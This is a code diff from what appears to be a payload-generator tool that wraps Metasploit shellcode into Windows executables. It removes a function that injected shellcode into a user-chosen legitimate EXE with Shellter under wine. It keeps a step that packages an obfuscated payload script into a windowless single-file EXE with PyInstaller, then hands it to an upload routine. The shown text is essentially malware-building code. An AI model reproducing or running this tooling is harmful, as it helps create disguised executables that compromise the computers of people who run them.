@@ -55,53 +55,27 @@ def askAndReturnModules(shellcode, metasploit_type):
 
         return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])
 
-def Shellter(shellcode):
-    payloadinexe_payloaddir = raw_input(
-        t.bold_green + '[*] EXE Full Filepath: ' + t.normal)
-    os.chdir(os.getcwd() + '/shellter')
-    with open('payloadbin', 'wb') as Csave:
-        Csave.write(shellcode)
-        Csave.close()
-    os.system('wine shellter.exe -a -f %s -s -p payloadbin ' %
-              payloadinexe_payloaddir)
-    os.system('mv %s %s'%(payloadinexe_payloaddir, payloaddir))
-    os.remove(payloadinexe_payloaddir + '.bak')
-    os.remove('payloadbin')
-    payloadinexe_payloadname = payloadinexe_payloaddir.split('/')[-1].rstrip('.exe')
-    DoPayloadUpload(payloadinexe_payloadname)
-
-
 def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
-    want_to_payloadinexe = raw_input(
-        t.bold_red + '[*] Inject Shellcode into an EXE (Shellter)? y/[n]: ' + t.normal)
+    print '[*] Creating Payload using Pyinstaller...'
+    p = subprocess.Popen(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
+                          '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    LOADING = Spinner()
+    while p.poll() == None:
+        LOADING.Update()
+        time.sleep(0.2)
+    print '\r',
+    sys.stdout.flush()
 
-    if want_to_payloadinexe == 'n' or want_to_payloadinexe =='':
-        with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
-            Filesave.write(FUNCTIONS().DoPyCipher(
-                SHELLCODE.injectwindows % (ez2read_shellcode)))
-            Filesave.close()
+    payloadstderr = p.stderr.read()
+    if re.search('error', payloadstderr.lower()):
+        print t.bold_red + '[*] Error In Creating Payload... Exiting..\n' + t.normal
+        sys.stdout.write(payloadstderr)
+        raise KeyboardInterrupt
+    os.system('mv %s/dist/payload.exe %s/%s.exe'% (payloaddir,payloaddir,payloadname))
+    print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir, payloadname) + t.normal
+    CleanUpPayloadMess(payloadname)
+    DoPayloadUpload(payloadname)
 
-        print '[*] Creating Payload using Pyinstaller...'
-        p = subprocess.Popen(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
-                              '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        LOADING = Spinner()
-        while p.poll() == None:
-            LOADING.Update()
-            time.sleep(0.2)
-        print '\r',
-        sys.stdout.flush()
-
-        payloadstderr = p.stderr.read()
-        if re.search('error', payloadstderr.lower()):
-            print t.bold_red + '[*] Error In Creating Payload... Exiting..\n' + t.normal
-            sys.stdout.write(payloadstderr)
-            raise KeyboardInterrupt
-        os.system('mv %s/dist/payload.exe %s/%s.exe'% (payloaddir,payloaddir,payloadname))
-        print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir, payloadname) + t.normal
-        CleanUpPayloadMess(payloadname)
-        DoPayloadUpload(payloadname)
-    else:
-        Shellter(shellcode)
 
 def CleanUpPayloadMess(payloadname):
     os.system('rm %s/logdict*' % os.getcwd())
